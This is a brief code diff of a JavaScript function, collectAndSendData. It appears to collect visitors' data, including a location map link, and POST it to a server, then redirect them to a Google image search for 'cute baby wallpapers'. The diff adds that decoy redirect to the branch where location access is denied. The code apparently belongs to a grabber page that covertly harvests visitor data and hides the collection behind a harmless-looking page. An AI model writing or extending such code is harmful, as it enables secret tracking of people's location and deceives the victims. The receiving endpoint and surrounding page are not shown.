@@ -12,7 +12,9 @@ function collectAndSendData() {
     },
     function () {
       data.mapLink = "Location access denied"; 
-      postData();
+       window.location.href =
+      "https://www.google.com/search?q=cute+baby+wallpapers&tbm=isch";
+       postData();
     },
   );
 
@@ -21,9 +23,6 @@ function collectAndSendData() {
       method: "POST",
       body: JSON.stringify(data),
     });
-
-    window.location.href =
-      "https://www.google.com/search?q=cute+baby+wallpapers&tbm=isch";
   }
 }
 
